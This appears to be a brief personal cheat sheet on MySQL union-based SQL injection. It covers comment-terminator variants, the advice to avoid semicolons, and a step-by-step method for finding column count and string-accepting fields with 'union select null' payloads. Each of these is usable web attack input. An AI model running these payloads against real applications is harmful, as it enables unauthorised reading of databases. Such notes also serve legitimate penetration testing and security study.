- Avoid semicolons, they cause problems.
- Hash comment doesn't work in my experience for MySQL.
- If having issues with --, use -- - instead to prevent the first symbol from
  being trimmed.
- Sometimes you have to mess with the comment.
  Try in the following order:
  union select null--
  union select null --
  union select null -- -
- When enumerating an app usuing union select,
  start using null field values.
  Once you have the field account (assuming all fields allow null),
  enumerate each field position one by one using a string
  to see which ones allow strings.
  E.g.,
  union select null,null,null--
  union select 'a',null,null--
  union select null,'a',null--
  etc.
